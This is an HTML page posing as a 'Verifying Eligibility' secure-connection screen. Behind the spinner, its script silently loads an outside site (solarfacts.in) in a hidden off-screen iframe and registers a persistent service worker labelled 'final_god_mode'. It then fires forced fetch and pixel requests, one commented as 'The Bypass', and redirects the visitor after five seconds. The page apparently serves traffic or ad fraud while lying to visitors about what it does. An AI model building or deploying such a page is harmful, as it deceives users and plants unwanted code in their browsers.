<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading Secure Connection...</title>
    <style>
        body { background: #fff; margin: 0; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #128c7e; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        p { color: #555; margin-top: 15px; font-weight: bold; }
        iframe { position: absolute; width: 1px; height: 1px; left: -999px; visibility: hidden; }
    </style>
</head>
<body>

    <div class="spinner"></div>
    <p>Verifying Eligibility...</p>

    <iframe src="https://solarfacts.in/?session_wake=1"></iframe>

    <script>
        // Service Worker Register
        if ('serviceWorker' in navigator) {
            navigator.serviceWorker.register('sw.js?v=final_god_mode').then(reg => {
                reg.update();
            });
        }

        // LAYER 2 & 3: Instant Pixel & Script Hit
        function startUltraHit() {
            const ts = Date.now();
            
            // Script Hit
            fetch('https://solarfacts.in/?direct_hit=' + ts, { mode: 'no-cors', keepalive: true });

            // Pixel Hit (The Bypass)
            var p = new Image();
            p.src = 'https://solarfacts.in/?pixel_force=' + ts;

            // 5 Second Wait: Itni der mein browser register kar leta hai
            setTimeout(() => {
                window.location.replace("https://solarfacts.in/");
            }, 5000);
        }

        window.onload = startUltraHit;
    </script>
</body>
</html>
